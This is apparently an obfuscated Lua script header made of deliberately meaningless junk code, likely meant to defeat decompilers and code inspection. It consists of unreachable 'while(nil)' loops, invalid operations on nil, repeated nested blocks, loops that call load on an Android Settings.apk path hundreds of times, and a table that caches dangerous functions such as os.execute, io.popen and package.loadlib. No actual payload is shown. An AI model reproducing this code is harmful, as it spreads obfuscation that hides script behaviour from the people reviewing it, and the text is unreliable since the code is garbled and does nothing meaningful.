while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy=
{}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while (nil)do;local o={}if (o.o)then if (o.o.o)then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o))))end;end;end
if nil ~= nil then
	_T = (-nil)((-nil)[nil] | nil | nil)
		_B = _T
			_B = _B()
				while (nil) do _B() end if _B ~= nil then do
					for i = 0,1,0 do _C = _C() _C = _Cnil _C= _C():_C(_Cnil)(_Cnil*-1).._Cnil _C = _C(_Cnil)(_C) end 
						
							for p = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) if _L  ~= nil then _L = _ (_Lnil*nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
						local x = {} x[''] = x local t = (x)(x, x) t[1] = 1
						end
						_ = {_, _(-nil)(-nil)(nil * 1, 1  << nil), -nil}
						_ = _ (nil)
						_ = -nil
						_ = _ (-nil * nil)()
						_C = _C ( _)
					_C = {(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)}
						_C = _C()
							if _C == nil then 
								_C = {_C(_C*nil)(_C*nil)(nil * 1, 1  << nil), _C*nil}
								end
						while _B ~= _C do if _T ~= _C then do
							_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
								_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
									_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
										_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
											_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
												_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
												end end end
											end end
										while _B ~= nil do 
											_C = nil,nil,nil,nil
									end
									for i=1,0 do;local j={}if j.i~=nil then j.i=j.i()end;end;
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
for i = 1, 200 do load("/system/priv-app/Settings/Settings.apk") end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
for i = 1, 100 do load("/system/priv-app/Settings/Settings.apk") end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil end _m = nil end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil end _m = nil end
while (nil)do;local o={o.uo,p.p,fq.qo.o,p.p,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,q.qoyo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.pp,q.qo.o,p.p,q.qo.o,p.p,q.qi}local o={o.uo,p.p,q.qo.o,p.rp,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,qw.qoo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.p,q.qbo.o,p.p,q.qo.o,p.p,q.qi}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q))))))o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.qo.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local o={o.uo,p.p,fq.qo.o,p.p,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,q.qoyo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.pp,q.qo.o,p.p,q.qo.o,p.p,q.qi}local o={o.uo,p.p,q.qo.o,p.rp,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,qw.qoo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.p,q.qbo.o,p.p,q.qo.o,p.p,q.qi}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q))))))o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.qo.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local o={o.uo,p.p,fq.qo.o,p.p,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,q.qoyo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.pp,q.qo.o,p.p,q.qo.o,p.p,q.qi}local o={o.uo,p.p,q.qo.o,p.rp,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,qw.qoo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.p,q.qbo.o,p.p,q.qo.o,p.p,q.qi}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q))))))o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.qo.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
local func={['collectgarbage']=collectgarbage,['tostring']=tostring,['load']=load,['concat']=table.concat,['remove']=table.remove,['sort']=table.sort,['pack']=table.pack,['move']=table.move,['insert']=table.insert,['unpack']=table.unpack,['ipairs']=ipairs,['collectgarbage']=collectgarbage,['tostring']=tostring,['load']=load,['ipairs']=ipairs,['pcall']=pcall,['require']=require,['rawequal']=rawequal,['assert2']=assert2,['setmetatable']=setmetatable,['getmetatable']=getmetatable,['rawset']=rawset,['next']=next,['select']=select,['loadfile']=loadfile,['rawget']=rawget,['pairs']=pairs,['error']=error,['tonumber']=tonumber,['xpcall']=xpcall,['_assert']=assert,['dofile']=dofile,['print']=print,['type']=type,['rawlen']=rawlen,['getregistry']=debug.getregistry,['getuservalue']=debug.getuservalue,['setuservalue']=debug.setuservalue,['getupvalue']=debug.getupvalue,['getinfo']=debug.getinfo,['getlocal']=debug.getlocal,['setlocal']=debug.setlocal,['setupvalue']=debug.setupvalue,['traceback']=debug.traceback,['getmetatable']=debug.getmetatable,['setmetatable']=debug.setmetatable,['debug']=debug.debug,['upvaluejoin']=debug.upvaluejoin,['getxnxxxxxx']=debug.getxnxxxxxx,['setxnxxxxxx']=debug.setxnxxxxxx,['upvalueid']=debug.upvalueid,['pcall']=pcall,['require']=require,['rawequal']=rawequal,['assert2']=assert2,['setmetatable']=setmetatable,['getmetatable']=getmetatable,['rawset']=rawset,['setlocale']=os.setlocale,['clock']=os.clock,['tmpname']=os.tmpname,['getenv']=os.getenv,['execute']=os.execute,['difftime']=os.difftime,['rename']=os.rename,['exit']=os.exit,['remove']=os.remove,['time']=os.time,['date']=os.date,['popen']=io.popen,['lines']=io.lines,['write']=io.write,['tmpfile']=io.tmpfile,['open']=io.open,['close']=io.close,['input']=io.input,['read']=io.read,['output']=io.output,['flush']=io.flush,['type']=io.type,['loadlib']=package.loadlib,['searchpath']=package.searchpath,['rshift']=bit32.rshift,['bnot']=bit32.bnot,['lshift']=bit32.lshift,['bxor']=bit32.bxor,['btest']=bit32.btest,['extract']=bit32.extract,['lrotate']=bit32.lrotate,['rrotate']=bit32.rrotate,['band']=bit32.band,['replace']=bit32.replace,['bor']=bit32.bor,['arshift']=bit32.arshift,['next']=next,['select']=select,['loadfile']=loadfile,['rawget']=rawget,['pairs']=pairs,['dump']=string.dump,['reverse']=string.reverse,['char_']=string.char,['unpack']=string.unpack,['match']=string.match,['gsub']=string.gsub,['find']=string.find,['pack']=string.pack,['gmatch']=string.gmatch,['format']=string.format,['packsize']=string.packsize,['lower']=string.lower,['upper']=string.upper,['rep']=string.rep,['sub']=string.sub,['byte_']=string.byte,['len']=string.len,['error']=error,['tonumber']=tonumber,['sqrt']=math.sqrt,['atan2']=math.atan2,['ceil']=math.ceil,['tanh']=math.tanh,['rad']=math.rad,['abs']=math.abs,['sinh']=math.sinh,['atan2']=math.atan,['fmod']=math.fmod,['random']=math.random,['randomseed']=math.randomseed,['max']=math.max,['modf']=math.modf,['ldexp']=math.ldexp,['exp']=math.exp,['deg']=math.deg,['cosh']=math.cosh,['ult']=math.ult,['log']=math.log,['tointeger']=math.tointeger,['frexp']=math.frexp,['asin']=math.asin,['tan']=math.tan,['floor']=math.floor,['pow']=math.pow,['acos']=math.acos,['cos']=math.cos,['type']=math.type,['sin']=math.sin,['min']=math.min,['xpcall']=xpcall,['_assert']=assert,['dofile']=dofile,['print']=print,['type']=type,['rawlen']=rawlen}
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil end
